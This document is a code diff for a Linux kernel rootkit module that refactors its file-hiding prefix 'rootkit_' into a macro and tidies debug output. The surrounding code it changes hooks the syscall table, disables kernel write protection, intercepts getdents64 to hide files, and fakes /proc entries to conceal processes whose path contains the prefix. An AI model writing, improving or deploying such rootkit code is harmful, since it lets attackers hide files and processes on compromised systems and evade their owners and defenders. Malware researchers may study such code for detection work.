@@ -33,12 +33,9 @@ struct linux_dirent {
 
 #define syscalls ((void**)SM_sys_call_table)
 
-#define FILE_HIDDEN_DISABLE 0
-#define FILE_HIDDEN_ENABLE 1
-
 atomic_t active_calls = ATOMIC_INIT(0);
 
-char *file_hiding_prefix = "rootkit_";
+#define HIDE_PREFIX "rootkit_"
 
 void disable_ro(void)
 {
@@ -60,7 +57,7 @@ asmlinkage int (*real_getdents64)(unsigned int, struct linux_dirent64 *, unsigne
 int shall_hide(char *file_name)
 {
   char *file_name_tmp = file_name;
-  char *prefix_tmp = file_hiding_prefix;
+  const char *prefix_tmp = HIDE_PREFIX;
 
   while (*prefix_tmp != '\0') {
     if (*file_name_tmp == '\0' || *file_name_tmp != *prefix_tmp) {
@@ -158,7 +155,7 @@ bool fake__proc_fill_cache( struct file *file,
     atomic_inc(&active_calls);
 
     snprintf(textbuf, sizeof(textbuf), "%d", (int)(long long)ptr);
-    if ((strcmp(name, textbuf) == 0)) // && (task->tgid == 17643))
+    if ((strcmp(name, textbuf) == 0))
     {
         trigger = true;
     }
@@ -176,7 +173,7 @@ bool fake__proc_fill_cache( struct file *file,
 
     if (trigger)
     {
-        if (PROC_I(d_inode(child))->op.proc_get_link(child, &path)) printk(KERN_INFO "errer\n");
+        if (PROC_I(d_inode(child))->op.proc_get_link(child, &path)) printk(KERN_INFO "bugbugbug\n");
         else
         {
             tmp = (char*)__get_free_page(GFP_TEMPORARY);
@@ -186,7 +183,7 @@ bool fake__proc_fill_cache( struct file *file,
                 if (!IS_ERR(pathname))
                 {
                     tmp[PAGE_SIZE - 1] = '\0';
-                    if (strstr(pathname, "/rootkit_"))
+                    if (strstr(pathname, "/" HIDE_PREFIX))
                     {
                         kill = true;
                     }
